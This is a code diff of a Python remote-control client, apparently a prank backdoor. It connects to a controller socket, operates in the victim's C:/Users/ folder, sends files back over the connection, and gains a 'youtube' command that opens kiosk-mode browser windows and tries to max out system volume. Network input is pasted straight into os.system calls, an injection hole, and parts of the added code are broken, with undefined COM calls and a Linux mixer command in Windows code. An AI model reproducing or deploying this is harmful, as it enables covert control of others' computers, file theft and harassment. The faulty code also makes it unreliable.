@@ -4,6 +4,9 @@ import socket
 import os
 import pickle
 import time
+from subprocess import call
+from ctypes import cast, POINTER
+
 
 TCP_IP = '127.0.0.1'
 TCP_PORT = 80
@@ -12,12 +15,14 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.connect((TCP_IP, TCP_PORT))
 os.chdir("C:/Users/")
-
-
+ytlink1 = "https://www.youtube.com/watch_popup?v="
+data = []
+data.insert(0, "")
 conn = s
 while 1:
+    data.insert(0, "")
     try:
-        conn.settimeout(15)
+        conn.settimeout(60)
         dataraw = conn.recv(BUFFER_SIZE).decode()
         data = dataraw.split()
     except:
@@ -32,29 +37,12 @@ while 1:
                 conn = s
                 connected = True
                 print("Woohoo Connection has been restored!")
-                conn.settimeout(15)
+                conn.settimeout(60)
                 dataraw = conn.recv(BUFFER_SIZE).decode()
                 data = dataraw.split()
             except:
                 s.close()
                 print("Retrying connection..")
-
-    if not data: 
-         while connected == False:
-            time.sleep(1)
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                s.connect((TCP_IP, TCP_PORT))
-                conn = s
-                connected = True
-                print("Woohoo Data is back!")
-                conn.settimeout(15)
-                dataraw = conn.recv(BUFFER_SIZE).decode()
-                data = dataraw.split()
-            except:
-                s.close()
-                print("Data lost..")
     try:
         print(data)
     except:
@@ -103,7 +91,20 @@ while 1:
                         s.send(l)
                         l = f.read(1024)
                 print("sent")
-            except:
-                print("something went wrong")
+            except Exception as e:
+                print("something went wrong  " + str(e))
+    elif data[0] == "":
+        print("thats nothing")
+    elif data[0] == "youtube":
+        if len(data) == 2:
+            os.system("start iexplore -k " + ytlink1 + data[1])
+        elif len(data) > 3:
+            if data[2] == "--earrape":
+                mmde = CoCreateInstance(CLSID_MMDeviceEnumerator, None, 
+                        CLSCTX_ALL, IID_IMMDeviceEnumerator)
+                
+                call(["amixer", "-D", "pulse", "set", "Master", "100%"])
+                os.system("start iexplore -k " + ytlink1 + data[1])
+
 
 conn.close()
